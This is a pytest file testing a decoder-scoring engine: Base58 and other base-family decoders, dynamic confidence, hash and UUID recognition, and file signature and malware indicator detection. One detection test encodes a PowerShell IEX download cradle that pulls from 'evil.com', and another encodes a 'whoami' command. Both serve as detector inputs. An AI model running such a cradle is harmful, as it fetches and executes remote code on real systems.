"""Tests for the Feb-2026 Candidate Scoring Engine + Base58/62/64URL/Z85 decoders.

Covers the user's explicit acceptance criteria:
    * Base58 example: `2NEpo7TZRRrLZSi2U` → `Hello World!`
    * Dynamic (not fixed) confidence based on multi-factor evidence
    * "Unknown" verdict for hashes / UUIDs / random tokens
    * Explanation includes signature and malware indicator detection
"""
from __future__ import annotations
import base64

import pytest

# Ensure the new base-family decoders are registered before tests run
import ops_base_family  # noqa: F401

from operations import OPERATIONS, run_operation
from reasoning.candidate_engine import (
    score_candidates, best_candidate, classify_unknown,
    HIGH_THRESHOLD, MIN_ACCEPT,
)


# ────────────────────────────────────────────────────────────────
# Decoder registration
# ────────────────────────────────────────────────────────────────

class TestBaseFamilyRegistration:
    """The new base-family ops must be registered in the OPERATIONS registry."""

    def test_base58_registered(self):
        assert "base58-decode" in OPERATIONS

    def test_base62_registered(self):
        assert "base62-decode" in OPERATIONS

    def test_base64url_registered(self):
        assert "base64url-decode" in OPERATIONS

    def test_z85_registered(self):
        assert "z85-decode" in OPERATIONS


# ────────────────────────────────────────────────────────────────
# Base58 decoder correctness
# ────────────────────────────────────────────────────────────────

class TestBase58Decoder:
    def test_bitcoin_hello_world(self):
        """The exact case from the user's prompt."""
        assert run_operation("base58-decode", "2NEpo7TZRRrLZSi2U", {}) == "Hello World!"

    def test_leading_ones_preserved(self):
        """Base58 uses '1' to represent leading zero bytes."""
        out = run_operation("base58-decode", "11", {})
        # Two '1's = two leading zero bytes
        assert out.encode("latin-1")[:2] == b"\x00\x00"

    def test_invalid_char_raises(self):
        with pytest.raises(Exception):
            # '0' is forbidden in the Bitcoin alphabet
            run_operation("base58-decode", "2NEpo0TZRRrLZSi2U", {})

    def test_forbidden_chars_never_appear(self):
        """Verify Base58 alphabet excludes 0, O, I, l."""
        from ops_base_family import _B58_ALPHABET
        for c in "0OIl":
            assert c not in _B58_ALPHABET


class TestBase62Decoder:
    def test_roundtrip(self):
        """Base62-encoded '\\x01\\x00\\x00' should decode to that."""
        # Base62: 62^3 = 238328, hex(238328)='3a2e0' — 5 hex chars, encodes to something
        # Simpler: encode "A" (0x41) = 65 in base62 = '13'
        out = run_operation("base62-decode", "13", {})
        assert out.encode("latin-1") == b"A"


class TestBase64URLDecoder:
    def test_jwt_style_padding_omitted(self):
        # base64url of 'Hello, World!' is 'SGVsbG8sIFdvcmxkIQ' (padding stripped)
        out = run_operation("base64url-decode", "SGVsbG8sIFdvcmxkIQ", {})
        assert out == "Hello, World!"

    def test_dash_underscore_alphabet(self):
        # `-` and `_` are the URL-safe versions of `+` and `/`
        # b'\xff' = base64 '/w==' = base64url '_w=='
        out = run_operation("base64url-decode", "_w==", {})
        assert out.encode("latin-1") == b"\xff"


class TestZ85Decoder:
    def test_z85_roundtrip(self):
        # Z85 encoding of "hello world!" needs len % 4 == 0 first (12 bytes)
        # b'HelloWorld!!' is 12 bytes → 15 z85 chars
        import struct
        raw = b"HelloWorld!!"
        # Manually compute Z85 encoding using the ops_base_family alphabet
        from ops_base_family import _Z85_ALPHABET, _decode_z85
        # Build encoding then decode
        def z85_enc(data):
            out = []
            for i in range(0, len(data), 4):
                n = int.from_bytes(data[i:i+4], "big")
                chars = []
                for _ in range(5):
                    n, r = divmod(n, 85)
                    chars.append(_Z85_ALPHABET[r])
                out.append("".join(reversed(chars)))
            return "".join(out)
        enc = z85_enc(raw)
        assert _decode_z85(enc) == raw


# ────────────────────────────────────────────────────────────────
# Candidate Engine — dynamic confidence
# ────────────────────────────────────────────────────────────────

class TestCandidateEngineBase58:
    """The user's Base58 example is the primary acceptance test."""

    INPUT = "2NEpo7TZRRrLZSi2U"

    def test_base58_wins(self):
        best = best_candidate(self.INPUT)
        assert best is not None
        assert best.op == "base58-decode"
        assert best.decoded == "Hello World!"
        assert best.confidence >= HIGH_THRESHOLD

    def test_evidence_populated(self):
        cands = score_candidates(self.INPUT, top_n=3)
        base58 = next((c for c in cands if c.op == "base58-decode"), None)
        assert base58 is not None
        ev = base58.evidence
        assert ev["alphabet_ratio"] == 1.0
        assert ev["length_valid"] is True
        assert ev["decode_ok"] is True
        assert ev["utf8_ok"] is True

    def test_rationale_lists_reasons(self):
        cands = score_candidates(self.INPUT, top_n=3)
        base58 = next((c for c in cands if c.op == "base58-decode"), None)
        rationale = base58.rationale
        assert "Base58" in rationale
        assert "decode-succeeded" in rationale
        assert "alphabet-fullmatch" in rationale


class TestCandidateEngineUnknownVerdict:
    """When no candidate reaches MIN_ACCEPT, engine returns unknown."""

    def test_sha256_hash_classified(self):
        h = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        # Best candidate confidence should be modest — hash is ambiguous
        best = best_candidate(h)
        # Even if a decoder returns SOMETHING, its confidence should be modest
        # (< HIGH_THRESHOLD 0.65). Explicitly check `classify_unknown` recognizes
        # the SHA-256 hash pattern.
        uv = classify_unknown(h)
        assert any("SHA-256" in hyp for hyp in uv.hypotheses)

    def test_plain_english_classified(self):
        best = best_candidate("This is plain English text.")
        # No high-confidence encoding match. Any winner should be well below HIGH.
        if best:
            assert best.confidence < HIGH_THRESHOLD

    def test_uuid_recognized(self):
        uv = classify_unknown("550e8400-e29b-41d4-a716-446655440000")
        assert any("UUID" in hyp or "GUID" in hyp for hyp in uv.hypotheses)


class TestCandidateEngineMalwareIndicators:
    """Malware indicator detection boosts confidence on true positives."""

    def test_powershell_base64_flags_indicators(self):
        payload = (b"powershell.exe -nop -c IEX(New-Object Net.WebClient)."
                    b"DownloadString('http://evil.com/x')")
        b64 = base64.b64encode(payload).decode()
        cands = score_candidates(b64, top_n=3)
        b64c = next((c for c in cands if c.op == "base64-decode"), None)
        assert b64c is not None
        indicators = set(b64c.evidence.get("malware_indicators") or [])
        assert "iex" in indicators
        assert "powershell.exe" in indicators
        assert b64c.confidence >= HIGH_THRESHOLD


class TestCandidateEngineSignatureDetection:
    """Known file signatures (PE, ELF, PDF, PNG, GZIP) boost confidence."""

    def test_pe_signature_detected(self):
        # PE header hex-encoded
        pe = bytes.fromhex("4d5a90000300000004000000ffff0000b800000000000000")
        hx = pe.hex()
        cands = score_candidates(hx, top_n=3)
        hex_c = next((c for c in cands if c.op == "hex-decode"), None)
        assert hex_c is not None
        assert "PE/DOS executable" in (hex_c.evidence.get("signature") or "")

    def test_png_signature_detected(self):
        # PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
        png_bytes = b"\x89PNG\r\n\x1a\nlots more binary data after this..."
        b64 = base64.b64encode(png_bytes).decode()
        cands = score_candidates(b64, top_n=3)
        b64c = next((c for c in cands if c.op == "base64-decode"), None)
        assert b64c is not None
        assert "PNG" in (b64c.evidence.get("signature") or "")


class TestCandidateEngineDynamicScoring:
    """Confidence must NOT be a fixed per-encoding constant."""

    def test_same_encoding_different_scores(self):
        """base64-decode should score very differently on a real payload
        vs. a random alphanumeric string."""
        real = base64.b64encode(b"powershell.exe -c whoami").decode()
        random_b64_shape = "aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV"

        cands_real = score_candidates(real, top_n=3)
        cands_rand = score_candidates(random_b64_shape, top_n=3)

        c1 = next((c for c in cands_real if c.op == "base64-decode"), None)
        c2 = next((c for c in cands_rand if c.op == "base64-decode"), None)

        # Real should be significantly higher (malware indicators, readable output)
        if c1 and c2:
            assert c1.confidence > c2.confidence

    def test_alphabet_mismatch_scores_zero(self):
        """Base58 fed a string with '0','O','I','l' must NOT be selected."""
        forbidden = "0OIl0OIl0OIl0OIl"
        cands = score_candidates(forbidden, top_n=5)
        b58 = next((c for c in cands if c.op == "base58-decode"), None)
        # Either not present (alphabet_ratio failed hard reject) or capped at 0.10
        assert b58 is None or b58.confidence <= 0.10


class TestCandidateEngineDoesNotFabricate:
    """Safety rule from user prompt: never fabricate decoded content."""

    def test_random_string_returns_unknown_or_low(self):
        random_str = "xkvjqhg zbnpwmt lfrycsn qbdgpst"
        best = best_candidate(random_str)
        # Either no confident winner OR the winner has a rationale explaining
        # why. Never assume ROT-N with high confidence on gibberish.
        if best:
            assert best.confidence < HIGH_THRESHOLD

    def test_empty_input_no_candidates(self):
        assert score_candidates("", top_n=5) == []
        assert best_candidate("") is None


# ────────────────────────────────────────────────────────────────
# Magic decoder integration — the primary user-facing test
# ────────────────────────────────────────────────────────────────

class TestMagicDecoderBase58Integration:
    """`magic_decode` should reach Base58 output when the input is Base58."""

    def test_hello_world_via_magic(self):
        from magic_decoder import magic_decode
        r = magic_decode("2NEpo7TZRRrLZSi2U")
        top = r["top_results"][0]
        assert "Hello World!" in top["output"]
        assert any(s["op"] == "base58-decode" for s in top["chain"])

    def test_deterministic_best_decode_end_to_end(self):
        from analysis_core import deterministic_best_decode
        r = deterministic_best_decode("2NEpo7TZRRrLZSi2U", analysis_mode="balanced")
        assert r["output"] == "Hello World!"
